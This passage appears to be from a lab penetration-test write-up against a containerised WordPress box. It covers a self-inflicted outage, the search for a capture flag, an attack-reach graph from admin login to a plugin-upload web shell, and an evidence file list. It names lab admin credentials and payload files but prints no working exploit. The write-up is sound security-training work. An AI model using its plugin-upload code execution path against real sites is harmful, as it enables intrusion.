*(a) A negative contaminated by privilege.* My first writability probe was
`su -s /bin/sh www-data -c "printf x >> …/functions.php"` — run through a **root**
`docker exec`. It succeeded, which proves nothing about a `www-data` boundary on its
own; I only treated it as evidence because I re-measured the same paths with
`is_readable`/`is_writable` **inside** the `uid=33` process (control 4). Every
negative in the *Discarded with reason* list 3 is labelled this way.

*(b) I broke the site, and the symptom pointed at the wrong cause.* That `printf x`
appended a bare `x` to `functions.php`, which has **no closing `?>`**, so the file
became a parse error. Every page then returned HTTP 500, including
`options-general.php`, and I initially read the `options-general.php` 500 as a lab
defect. It was mine. Diagnosis: `php -l` → `PHP Parse error: syntax error,
unexpected end of file … on line 207`, and `wc -c` 5 544 vs the shipped 5 543.
The write itself was done as **root** when the boundary I cared about was
`www-data`, and I chose an *in-place append* as a writability test instead of
creating and removing a scratch file — a destructive test for a non-destructive
question. Recovered by recreating the container from the image
(`docker rm -f` + `docker run -d`), after which `php -l` reported
`No syntax errors detected` and `options-general.php` returned 200 / 151 585 bytes.
Worth stating plainly: the *instrument* was privileged, the *assertion* was
untargeted, and a `test -w`-shaped mistake took the whole site down for ~10 minutes
before a `php -l` would have caught it.

*(c) A third, milder one:* the REST users probe `wp_validate_auth_cookie` call
initially received a **percent-encoded** cookie value and correctly reported
`COOKIE_VALIDATES=false` — the instrument was right and my input was wrong. The
fix (URL-decode first) turned it into `true`, and the negative control with one
character changed stayed `false`. Had I stopped at the first `false` I would have
filed "cookie validation rejects valid sessions", which is the inverse of the truth.

---

## Reward

**No `FLAG{}` exists in this lab.** The search that established it, with counts:

| Search | Instrument | Work count | Result |
|---|---|---|---|
| Literal `FLAG{` across the filesystem | `grep -rIo 'FLAG{' / --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev` | 10 633 files considered (`find / -xdev -type f \| wc -l`) | **0** occurrences |
| Same, bare word `FLAG` (case-insensitive) | `grep -rIilE 'flag{\|ctf{\|FLAG' /` | same 10 633 files | 700 files, **all** Debian/Ubuntu `copyright` and shell-completion noise; **0** contain `FLAG{` |
| Generic `{…}` token shape outside `/usr/share` | `grep -rIoE '[A-Za-z0-9_]{2,12}\{…\}'` | filesystem minus `/usr/share` | 4 134 hits, all Perl source (`$map{…}`, `ENV{…}`); 0 reward-shaped |
| `FLAG{` in the CMS database | `LIKE '%FLAG{%'` over `wp_options`, `wp_posts`, `wp_postmeta` | 174 + 9 + 0 rows scanned | **0** rows |
| HTTP bodies | bodies captured in `evidence/` | 84 298 + 20 269 + 2 016 + 7 896 + 6 569 + 1 650 + 1 684 bytes | 0 |

**Every one of those instruments has a green positive control**, recorded above as
controls 7 and 8: the same `grep` returns 1 for a string known to exist, and the same
`LIKE` returns 4 rows for `%PressEnter%`. A zero from an instrument proven capable
of returning a non-zero is a negative; a zero from an instrument never seen
succeeding is untested, and that is defect 2 above.

What the lab ships instead, in three 32-byte and one 52-byte files, quoted verbatim
in Finding 7: `/root/root.txt` is a decoy sentence, and `/root/root_true.txt` and
`/home/enter/user.txt` are bare MD5 digests with no wrapper. **The `FLAG{}` column
of `corpus/INDEX.md` is the single source for which labs carry a reward; this row
belongs in the "no reward" group, and I make no claim about its position in any
sequence.**

---

## Chain, as a graph of reach

```
Internet ──:80──► Apache (uid 0 master → uid 33 prefork workers)
                    │
                    ├─ Host: pressenter.hl  ──► /var/www/pressenter   WordPress 6.6.1
                    └─ any other Host        ──► /var/www/html        3-file decoy
                                                        │
                                             pressi / dumbass  (phpass, $P$)
                                                        │
                                                        ├─ theme editor ──► validated, REVERTED
                                                        └─ plugin ZIP  ──► written, EXECUTED
                                                                        │
                                                              uid=33(www-data)
                                                                        │
                                          0 further edges: no setuid bit,
                                          no writable system file, no login
                                          service, MySQL admin has no FILE
                                                                        │
                                                              ✗ enter (1001) unreachable
                                                                        │
                                                              ✗ root unreachable
```

**Lab restored from the image** (`docker rm -f` + `docker run -d` from
`pressenter:latest`), not by undoing edits. Verified positively after restore:
`id` → `uid=0(root) gid=0(root) groups=0(root)`; `php -l …/functions.php` →
`No syntax errors detected`; `functions.php` back to 5 543 bytes;
`/wp-admin/options-general.php` → `200`, 151 585 bytes; `wp-includes/version.php:19`
→ `6.6.1`. All engagement artefacts were removed by that recreation; the three
plugins I uploaded existed only in the pre-restore container.

---

## Evidence files

`corpus/117/evidence/` — **62 tracked files, and that is exactly what a reader can
obtain from a clone.** Nothing in this inventory is an artefact this list cannot produce,
and nothing it cannot produce is listed.

- `nmap-full.txt` — the `-p-` scan. **There is no `nmap-udp.txt`**: the UDP sweep produced
  nothing worth keeping, and an absent file is not evidence.
- `body-*.txt` (4 vhost bodies), `home.html`, `readme.html`, `admin-ok.html` /
  `admin-noauth.html`, `author2.html`, `optgen*.html`, `opt-save*.txt`,
  `settings.enc` / `settings.json`, `feed.xml` / `cfeed.xml`,
  `rest-*.json`, `login-ok.txt` / `login-bad.txt` / `login-ok2.txt`,
  `te-*.html` / `te-*.txt` / `tetheme-editor.php` / `teplugin-editor.php`
  (theme- and plugin-editor pages and responses), `plugup*.html`,
  `plugup-res.html` / `plugup-res2.txt` / `pu3.html` / `plugins*.html` /
  `plugres2.html`, `up2.txt` / `up3.txt` / `upres.txt`, `act*.txt`, `l3.txt` /
  `l4.txt` / `l5.txt`, `rce1.txt` (subprocess `id`), `rce2.txt` (PHP-native
  `/proc/self/status`), `salt.txt` / `salt2.txt` (the salt probe),
  `candidates.txt`, `dictionary.txt`, `yes.pl` (the yescrypt sweeper),
  `ctl.php` / `functions.orig.php` / `functions.payload.php` (the payloads).

**Two things that do not survive a clone, said plainly.** The three uploaded plugin
archives — `pe117shell.zip`, `pe117id.zip`, `pe117salt.zip` — exist on the working disk
and are **excluded by `.gitignore`'s `*.zip`**, so a cloned reader gets **no** plugin ZIP
from this repository; the payloads inside them are reproducible from `ctl.php` and
`functions.payload.php`, which are tracked. And **there is no `cj*.txt` cookie jar**: the
sessions were carried in the operator's transient jar, not committed, so the cookie values
quoted in this writeup cannot be replayed from a clone — which is the intended state, not
an oversight.
